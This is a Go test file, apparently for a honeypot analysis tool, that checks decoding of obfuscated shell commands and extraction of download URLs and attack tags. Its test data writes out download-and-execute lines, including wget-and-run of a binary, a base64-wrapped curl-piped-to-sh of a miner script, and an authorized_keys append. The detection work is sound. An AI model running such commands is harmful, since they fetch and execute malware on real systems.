package main

import (
	"encoding/base64"
	"encoding/json"
	"strings"
	"testing"
	"time"
)

func TestRevealHidden(t *testing.T) {
	inner := "cd /tmp; wget http://203.0.113.9/bins/x86 -O x; chmod +x x; ./x"
	b64 := base64.StdEncoding.EncodeToString([]byte(inner))
	nested := base64.StdEncoding.EncodeToString([]byte("echo " + b64 + " | base64 -d | sh"))
	cases := []struct{ in, want string }{
		{"echo " + b64 + " | base64 -d | bash", inner},
		{"echo " + nested + "|base64 -d|sh", inner}, // verschachtelt
		{`printf '\x77\x67\x65\x74\x20\x68\x74\x74\x70\x3a\x2f\x2f\x78\x2e\x79\x2f\x61'`, "wget http://x.y/a"},
		{`echo -e '\167\147\145\164\040\150\164\164\160\072\057\057\170\056\171'`, "wget http://x.y"},
		{"/shell?cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F198.51.100.4%2Fm", "/shell?cd /tmp; wget http://198.51.100.4/m"},
	}
	for _, c := range cases {
		got := revealHidden(c.in)
		if !contains(got, c.want) {
			t.Errorf("%q: erwartet %q in %q", c.in, c.want, got)
		}
	}
	// keine Funde: SSH-Schlüssel (binär), Hash, normaler Pfad, normaler Befehl
	for _, in := range []string{
		"echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7vbqajDhA >> .ssh/authorized_keys",
		"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
		"/usr/local/bin/somethinglong/anotherpathpart",
		"cat /proc/cpuinfo | grep name | wc -l",
	} {
		if got := revealHidden(in); len(got) != 0 {
			t.Errorf("%q: unerwartet %q", in, got)
		}
	}
}

func TestHiddenURLInReportAndAttack(t *testing.T) {
	cmd := "echo " + base64.StdEncoding.EncodeToString([]byte("curl -fsSL http://198.51.100.77/miner.sh | sh")) + " | base64 -d | sh"
	d, _ := json.Marshal(map[string]any{"input": cmd})
	e := &Event{TS: time.Now(), Type: "command", Service: "ssh", SrcIP: "203.0.113.4", DstPort: 22, Data: d}
	r := BuildReport("IP 203.0.113.4", []*Event{e}, false)
	if !contains(r.URLs, "http://198.51.100.77/miner.sh") || len(r.Decoded) != 1 || !strings.Contains(r.Text(), "entschlüsselt: curl") {
		t.Fatalf("Bericht: urls=%v decoded=%v\n%s", r.URLs, r.Decoded, r.Text())
	}
	var tags []string
	for _, x := range r.Tags {
		tags = append(tags, x.ID)
	}
	if !contains(tags, "obfuscation") || !contains(tags, "download_exec") {
		t.Errorf("Muster: %v", tags)
	}
	a := newAttack(e)
	a.add(e)
	a.finish()
	if !contains(a.URLs, "http://198.51.100.77/miner.sh") || len(a.Decoded) != 1 {
		t.Errorf("Angriff: urls=%v decoded=%v", a.URLs, a.Decoded)
	}
	found := false
	for _, k := range topKeys(e) {
		if k[0] == "url" && k[1] == "http://198.51.100.77/miner.sh" {
			found = true
		}
	}
	if !found {
		t.Errorf("Nachlade-Adresse fehlt in der Zähltabelle: %v", topKeys(e))
	}
}
